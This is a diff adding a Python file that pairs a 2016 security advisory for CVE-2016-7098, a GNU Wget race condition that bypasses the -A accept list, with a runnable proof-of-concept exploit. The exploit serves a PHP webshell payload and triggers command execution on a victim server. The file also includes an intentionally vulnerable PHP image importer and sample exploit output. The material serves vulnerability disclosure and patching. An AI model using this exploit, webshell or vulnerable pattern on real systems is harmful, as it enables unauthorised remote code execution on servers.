@@ -1,0 +1,331 @@
+'''
+=============================================
+- Discovered by: Dawid Golunski
+- dawid[at]legalhackers.com
+- https://legalhackers.com
+- https://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html
+
+- CVE-2016-7098
+- Release date: 24.11.2016
+- Revision 1.0
+- Severity: Medium
+=============================================
+
+
+I. VULNERABILITY
+-------------------------
+
+GNU Wget < 1.18       Access List Bypass / Race Condition
+
+
+II. BACKGROUND
+-------------------------
+
+"GNU Wget is a free software package for retrieving files using HTTP, HTTPS and 
+FTP, the most widely-used Internet protocols. 
+It is a non-interactive commandline tool, so it may easily be called from 
+scripts, cron jobs, terminals without X-Windows support, etc.
+
+GNU Wget has many features to make retrieving large files or mirroring entire 
+web or FTP sites easy
+"
+
+https://www.gnu.org/software/wget/
+
+
+III. INTRODUCTION
+-------------------------
+
+GNU wget in version 1.17 and earlier, when used in mirroring/recursive mode, 
+is affected by a Race Condition vulnerability that might allow remote attackers 
+to bypass intended wget access list restrictions specified with -A parameter.
+This might allow attackers to place malicious/restricted files onto the system. 
+Depending on the application / download directory, this could potentially lead 
+to other vulnerabilities such as code execution etc.
+
+
+IV. DESCRIPTION
+-------------------------
+
+When wget is used in recursive/mirroring mode, according to the manual it can 
+take the following access list options:
+
+"Recursive Accept/Reject Options:
+  -A acclist --accept acclist
+  -R rejlist --reject rejlist
+
+Specify comma-separated lists of file name suffixes or patterns to accept or 
+reject. Note that if any of the wildcard characters, *, ?, [ or ], appear in 
+an element of acclist or rejlist, it will be treated as a pattern, rather 
+than a suffix."
+
+
+These can for example be used to only download JPG images. 
+
+It was however discovered that when a single file is requested with recursive 
+option (-r / -m) and an access list ( -A ), wget only applies the checks at the
+end of the download process. 
+
+This can be observed in the output below:
+
+# wget -r -nH -A '*.jpg' http://attackersvr/test.php
+Resolving attackersvr... 192.168.57.1
+Connecting to attackersvr|192.168.57.1|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/plain]
+Saving to: â€˜test.phpâ€™
+
+15:05:46 (27.3 B/s) - â€˜test.phpâ€™ saved [52]
+
+Removing test.php since it should be rejected.
+
+FINISHED
+
+
+Although wget deletes the file at the end of the download process, this creates 
+a race condition as an attacker with control over the URL/remote server could 
+intentionally slow down the download process so that they had a chance to make 
+use of the malicious file before it gets deleted.
+
+It is very easy to win the race as the file only gets deleted after the HTTP 
+connection is terminated. The attacker could therefore keep the connection open 
+as long as it was necessary to make use of the uploaded file as demonstrated
+in the proof of concept below.
+
+
+V. PROOF OF CONCEPT EXPLOIT
+------------------------------
+
+
+Here is a simple vulnerable PHP web application that uses wget to download 
+images from a user-provided server/URL:
+
+
+---[ image_importer.php ]---
+
+<?php
+        // Vulnerable webapp [image_importer.php]
+        // Uses wget to import user images from provided site URL 
+        // It only accepts JPG files (-A wget option).
+
+        if ( isset($_GET['imgurl']) ) {
+                $URL = escapeshellarg($_GET['imgurl']);
+        } else {
+                die("imgurl parameter missing");
+        }
+
+        if ( !file_exists("image_uploads") ) {
+                mkdir("image_uploads");
+        }
+
+        // Download user JPG images into /image_uploads directory
+        system("wget -r -nH -P image_uploads -A '*.jpg' $URL 2>&1");
+?>
+
+
+----------------------------
+
+
+For example:
+https://victimsvr/image_importer.php?imgurl= href="http://images/logo.jpg">http://images/logo.jpg
+
+will cause wget to upload logo.jpg file into:
+https://victimsvr/images_uploads/logo.jpg
+
+The wget access list (-A) is to ensure that only .jpg files get uploaded.
+
+However due to the wget race condition vulnerability an attacker could use 
+the exploit below to upload an arbitrary PHP script to /image_uploads directory
+and achieve code execution.
+
+
+---[ wget-race-exploit.py ]---
+'''
+
+#!/usr/bin/env python
+
+#
+# Wget < 1.18  Access List Bypass / Race Condition PoC Exploit
+# CVE-2016-7098
+#
+# Dawid Golunski
+# https://legalhackers.com
+#
+#
+# This PoC wget exploit can be used to bypass wget -A access list and upload a malicious
+# file for long enough to take advantage of it.
+# The exploit sets up a web server on port 80 and waits for a download request from wget.
+# It then supplies a PHP webshell payload and requests the uploaded file before it gets
+# removed by wget. 
+#
+# Adjust target URL (WEBSHELL_URL) before executing.
+# 
+# Full advisory at:
+#
+# https://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html
+#
+# Disclaimer:
+#
+# For testing purposes only. Do no harm.
+#
+# 
+
+import SimpleHTTPServer
+import time
+import SocketServer
+import urllib2
+import sys
+
+HTTP_LISTEN_IP = '0.0.0.0'
+HTTP_LISTEN_PORT = 80
+
+PAYLOAD='''
+<?php
+	//our webshell
+	system($_GET["cmd"]);
+	system("touch /tmp/wgethack");
+?>
+'''
+
+# Webshell URL to be requested before the connection is closed 
+# i.e before the uploaded "temporary" file gets removed.
+WEBSHELL_URL="http://victimsvr/image_uploads/webshell.php"
+
+# Command to be executed through 'cmd' GET paramter of the webshell
+CMD="/usr/bin/id"
+
+
+class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
+   def do_GET(self):
+       # Send the payload on GET request
+       print "[+] Got connection from wget requesting " + self.path + " via GET :)\n"
+       self.send_response(200)
+       self.send_header('Content-type', 'text/plain')
+       self.end_headers()
+       self.wfile.write(PAYLOAD)
+       print "\n[+] PHP webshell payload was sent.\n"
+
+       # Wait for the file to be flushed to disk on remote host etc.
+       print "[+} Sleep for 2s to make sure the file has been flushed to the disk on the target...\n"
+       time.sleep(2)
+
+       # Request uploaded webshell
+       print "[+} File '" + self.path + "' should be saved by now :)\n"
+       print "[+} Executing " + CMD + " via webshell URL: " + WEBSHELL_URL + "?cmd=" + CMD + "\n"
+       print "[+} Command result: "
+       print urllib2.urlopen(WEBSHELL_URL+"?cmd="+CMD).read()
+
+       print "[+} All done. Closing HTTP connection...\n"
+       # Connection will be closed on request handler return
+       return
+
+handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)
+
+print "\nWget < 1.18 Access List Bypass / Race Condition PoC Exploit \nCVE-2016-7098\n\nDawid Golunski \nhttps://legalhackers.com \n"
+print "[+} Exploit Web server started on HTTP port %s. Waiting for wget to connect...\n" % HTTP_LISTEN_PORT
+
+handler.serve_forever()
+
+'''
+------------------------------
+
+If the attacker run this exploit on their server ('attackersver') and pointed 
+the vulnerable script image_importer.php at it via URL:
+
+https://victimsvr/image_importer.php?imgurl= href="http://attackersvr/webshell.php">http://attackersvr/webshell.php
+
+The attacker will see output similar to:
+
+
+
+root@attackersvr:~# ./wget-race-exploit.py 
+
+Wget < 1.18 Access List Bypass / Race Condition PoC Exploit 
+CVE-2016-7098
+
+Dawid Golunski 
+https://legalhackers.com 
+
+[+} Exploit Web server started on HTTP port 80. Waiting for wget to connect...
+
+[+] Got connection from wget requesting /webshell.php via GET :)
+
+victimsvr - - [24/Nov/2016 00:46:18] "GET /webshell.php HTTP/1.1" 200 -
+
+[+] PHP webshell payload was sent.
+
+[+} Sleep for 2s to make sure the file has been flushed to the disk on the target...
+
+[+} File '/webshell.php' should be saved by now :)
+
+[+} Executing /usr/bin/id via webshell URL: http://victimsvr/image_uploads/webshell.php?cmd=/usr/bin/id
+
+[+} Command result: 
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(nagcmd)
+
+[+} All done. Closing HTTP connection...
+
+
+
+VI. BUSINESS IMPACT
+-------------------------
+
+The vulnerability might allow remote servers to bypass intended wget access list 
+restrictions to temporarily store a malicious file on the server. 
+In certain cases, depending on the context wget command was used in and download
+path, this issue could potentially lead to other vulnerabilities such as
+script execution as shown in the PoC section.
+ 
+VII. SYSTEMS AFFECTED
+-------------------------
+
+Wget < 1.18
+ 
+VIII. SOLUTION
+-------------------------
+
+Update to latest version of wget 1.18 or apply patches provided by the vendor.
+ 
+IX. REFERENCES
+-------------------------
+
+https://legalhackers.com
+
+https://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html
+
+https://legalhackers.com/exploits/CVE-2016-7098/wget-race-exploit.py
+
+https://www.gnu.org/software/wget/
+
+https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-7098
+
+https://security-tracker.debian.org/tracker/CVE-2016-7098
+
+http://lists.opensuse.org/opensuse-updates/2016-09/msg00044.html
+
+http://lists.gnu.org/archive/html/bug-wget/2016-08/msg00124.html
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7098
+
+
+X. CREDITS
+-------------------------
+
+The vulnerability has been discovered by Dawid Golunski
+dawid (at) legalhackers (dot) com
+
+https://legalhackers.com
+ 
+XI. REVISION HISTORY
+-------------------------
+
+24.11.2016 - Advisory released
+ 
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
+'''
